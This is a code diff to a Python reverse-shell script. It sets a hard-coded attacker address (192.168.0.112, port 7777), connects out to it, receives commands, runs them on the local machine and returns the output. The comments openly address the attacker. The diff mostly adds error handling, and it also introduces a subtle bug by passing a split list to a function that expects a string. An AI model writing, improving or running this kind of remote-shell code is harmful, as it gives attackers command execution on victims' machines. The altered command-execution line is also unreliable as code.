@@ -7,16 +7,25 @@
 import socket
 import subprocess
 import os
+import shlex
 
-IP = "ATTACKER_IP"  # Replace with your attacker's IP
-PORT = 4444          # Replace with your desired port
+IP = "192.168.0.112"  # Replace with your attacker's IP
+PORT = 7777           # Replace with your desired port
 
 def connect():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((IP, PORT))
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((IP, PORT))
+    except Exception as e:
+        print(f"Failed to create/connect the socket: {str(e)}")
+        return
 
     while True:
-        command = s.recv(1024).decode()
+        try:
+            command = s.recv(1024).decode()
+        except Exception as e:
+            print(f"Failed to receive command: {str(e)}")
+            break
 
         if command.lower() == "exit":
             break
@@ -26,9 +35,11 @@ def connect():
                 s.send(f"Changed directory to {os.getcwd()}\n".encode())
             except FileNotFoundError as e:
                 s.send(f"Directory not found: {str(e)}\n".encode())
+            except Exception as e:
+                s.send(f"Failed to change directory: {str(e)}\n".encode())
         else:
             try:
-                output = subprocess.getoutput(command)
+                output = subprocess.getoutput(shlex.split(command))
                 s.send(output.encode())
             except Exception as e:
                 s.send(f"Error executing command: {str(e)}\n".encode())
@@ -36,3 +47,5 @@ def connect():
     s.close()
 
 connect()
+
+
